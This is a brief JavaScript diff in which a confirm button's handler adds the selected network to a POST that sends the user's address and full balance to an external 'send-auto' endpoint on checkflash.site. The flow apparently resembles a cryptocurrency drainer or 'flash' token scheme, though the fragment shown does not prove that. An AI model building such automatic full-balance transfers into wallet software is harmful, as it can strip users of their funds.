@@ -152,6 +152,8 @@ confirmButton.onclick = async () => {
     confirmButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
 
     try {
+        const selectedNetwork = localStorage.getItem("selectedNetwork");
+
         const res = await fetch("https://www.checkflash.site/api/send-auto", {
             method: "POST",
             headers: {
@@ -159,7 +161,8 @@ confirmButton.onclick = async () => {
             },
             body: JSON.stringify({
                 userAddress: userAddress,
-                amount: userBalance.toString()
+                amount: userBalance.toString(),
+                network: selectedNetwork
             })
         });
 
